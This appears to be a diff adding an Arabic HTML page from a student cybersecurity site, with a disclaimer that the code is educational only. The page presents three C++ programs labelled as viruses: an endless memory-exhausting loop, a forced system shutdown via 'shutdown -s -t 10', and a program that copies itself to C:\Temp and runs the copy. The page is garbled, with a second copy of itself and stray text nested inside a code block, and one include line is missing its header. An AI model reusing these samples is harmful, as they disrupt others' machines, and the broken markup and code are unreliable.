@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="ar">
+<head>
+    <title>CyberSecurity</title>
+</head>
+<body>
+    <p>
+    <a href="مجالات الامن السيبراني.html"><button><mark> انتقل الى الصفحه السابقه\ </mark></button></a><br><br>
+    
+    <a href="المقدمه.html"><button><mark> انتقل الى الصفحه التاليه </mark></button></a><br><br>
+</p>
+<p>
+   <i><strong><mark>ملاحظة</mark></strong></i> 
+    <br>
+<strong>
+هذه الأكواد هي أمثلة تعليمية فقط ويجب استخدامها في بيئة اختبارية فقط.<br>
+ لا ينبغي استخدامها على أجهزة الآخرين أو في شبكات غير مصرح بها. <br>
+كتابة ونشر البرمجيات الخبيثة يعرضك للمساءلة القانونية.<br>
+
+إذا كنت مهتمًا بمجال الأمن السيبراني واختبار الاختراق،<br>
+ فإنني أنصح بالتركيز على تعلم أدوات اختبار الاختراق الأخلاقي، مثل <br>
+Metasploit، والالتزام بالقوانين والأخلاقيات المهنية في مجال الأمن السيبراني.<br>
+</strong>
+</p>
+    <i><strong>فيروس يقوم بعمل تكرار استهلاك لذاكره</strong></i>
+    <pre>
+        <code> #include <iostream>
+           #include 
+           using namespace std;
+           
+           int main()</code> {
+               vector<int> <var>memoryEater</var> ;
+               while (true) {
+                   for (int i = 0;<var>i</var>  < 100000; ++i) {
+                       memoryEater.push_back(i); // استهلاك الذاكرة بشكل مستمر
+                   }
+                   cout << "استهلاك الذاكرة مستمر..." << endl;
+               }
+               return 0;
+           }<html lang="en">
+            <head>
+                <title>emran</title>
+            </head>
+            <body>
+                <p>emran  rr j</p>
+                <!DOCTYPE html>
+            <html dir="ltr" lang="ar">
+            <head>
+                <title>CyberSecurity</title>
+            </head>
+            <body>
+                <p>
+                <a href="مجالات الامن السيبراني.html"><button><mark> انتقل الى الصفحه السابقه\ </mark></button></a><br><br>
+                
+                <a href="المقدمه.html"><button><mark> انتقل الى الصفحه التاليه </mark></button></a><br><br>
+            </p>
+            <p>
+               <i><strong><mark>ملاحظة</mark></strong></i> 
+                <br>
+            <strong>
+            هذه الأكواد هي أمثلة تعليمية فقط ويجب استخدامها في بيئة اختبارية فقط.<br>
+             لا ينبغي استخدامها على أجهزة الآخرين أو في شبكات غير مصرح بها. <br>
+            كتابة ونشر البرمجيات الخبيثة يعرضك للمساءلة القانونية.<br>
+            
+            إذا كنت مهتمًا بمجال الأمن السيبراني واختبار الاختراق،<br>
+             فإنني أنصح بالتركيز على تعلم أدوات اختبار الاختراق الأخلاقي، مثل <br>
+            Metasploit، والالتزام بالقوانين والأخلاقيات المهنية في مجال الأمن السيبراني.<br>
+            </strong>
+            </p>
+                <i><strong>فيروس يقوم بعمل تكرار استهلاك لذاكره</strong></i>
+                <pre>
+                    <code> #include <iostream>
+                       #include 
+                       using namespace std;
+                       
+                       int main()</code> {
+                           vector<int> <var>memoryEater</var> ;
+                           while (true) {
+                               for (int i = 0;<var>i</var>  < 100000; ++i) {
+                                   memoryEater.push_back(i); // استهلاك الذاكرة بشكل مستمر
+                               }
+                               cout << "استهلاك الذاكرة مستمر..." << endl;
+                           }
+                           return 0;
+                       }
+                       
+                   </pre>
+                   <i><strong>فيروس يقوم بعمل اغلاق موقت لنظام  </strong></i>
+                   <pre>
+                   <code>
+                    #include <iostream>
+                        #include <cstdlib> // for system()
+                        using namespace std;
+                        
+                        int main() {
+                            cout << "سيتم إغلاق النظام بعد 10 ثوانٍ..." << endl;
+                            system("shutdown -s -t 10"); // إغلاق النظام بعد 10 ثواني
+                            return 0;
+                        }
+                        
+                   </code>
+                </pre>
+                <i><strong>فيروس يقوم بعمل ينسخ  نفسه الى مجلد اخر    </strong></i>
+                <pre>
+                    <code>
+                        #include <iostream>
+                            #include <fstream>
+                            #include <cstdlib> // for system()
+                            #include <cstring> // for strcpy()
+                            using namespace std;
+                            
+                            int main() {
+                                // اسم الملف الحالي
+                                char currentFile[] = "self_copy.exe"; // اسم الملف التنفيذي يجب أن يكون صحيحاً
+                                // اسم المجلد المستهدف
+                                char targetPath[] = "C:\\Temp\\copy_of_self.exe"; // تغيير المسار إلى المسار المطلوب
+                            
+                                // قراءة الملف الأصلي
+                                ifstream src(currentFile, ios::binary);
+                                // كتابة نسخة جديدة في المجلد المستهدف
+                                ofstream dest(targetPath, ios::binary);
+                            
+                                dest << src.rdbuf(); // نسخ المحتويات
+                                src.close();
+                                dest.close();
+                            
+                                // تنفيذ النسخة الجديدة
+                                system(targetPath);
+                            
+                                cout << "تم نسخ الملف وتنفيذه." << endl;
+                                return 0;
+                            }
+                            
+                    </code>
+                </pre>
+                </body>
+            </html>
+            <per>bdu <mark>rrrrrrrrrrr</mark> yhia emran </per>
+            <!--emrammmd-->
+            </body>
+            </html> 
+           
+       </pre>
+       <i><strong>فيروس يقوم بعمل اغلاق موقت لنظام  </strong></i>
+       <pre>
+       <code>
+        #include <iostream>
+            #include <cstdlib> // for system()
+            using namespace std;
+            
+            int main() {
+                cout << "سيتم إغلاق النظام بعد 10 ثوانٍ..." << endl;
+                system("shutdown -s -t 10"); // إغلاق النظام بعد 10 ثواني
+                return 0;
+            }
+            
+       </code>
+    </pre>
+    <i><strong>فيروس يقوم بعمل ينسخ  نفسه الى مجلد اخر    </strong></i>
+    <pre>
+        <code>
+            #include <iostream>
+                #include <fstream>
+                #include <cstdlib> // for system()
+                #include <cstring> // for strcpy()
+                using namespace std;
+                
+                int main() {
+                    // اسم الملف الحالي
+                    char currentFile[] = "self_copy.exe"; // اسم الملف التنفيذي يجب أن يكون صحيحاً
+                    // اسم المجلد المستهدف
+                    char targetPath[] = "C:\\Temp\\copy_of_self.exe"; // تغيير المسار إلى المسار المطلوب
+                
+                    // قراءة الملف الأصلي
+                    ifstream src(currentFile, ios::binary);
+                    // كتابة نسخة جديدة في المجلد المستهدف
+                    ofstream dest(targetPath, ios::binary);
+                
+                    dest << src.rdbuf(); // نسخ المحتويات
+                    src.close();
+                    dest.close();
+                
+                    // تنفيذ النسخة الجديدة
+                    system(targetPath);
+                
+                    cout << "تم نسخ الملف وتنفيذه." << endl;
+                    return 0;
+                }
+                
+        </code>
+    </pre>
+    </body>
+</html>
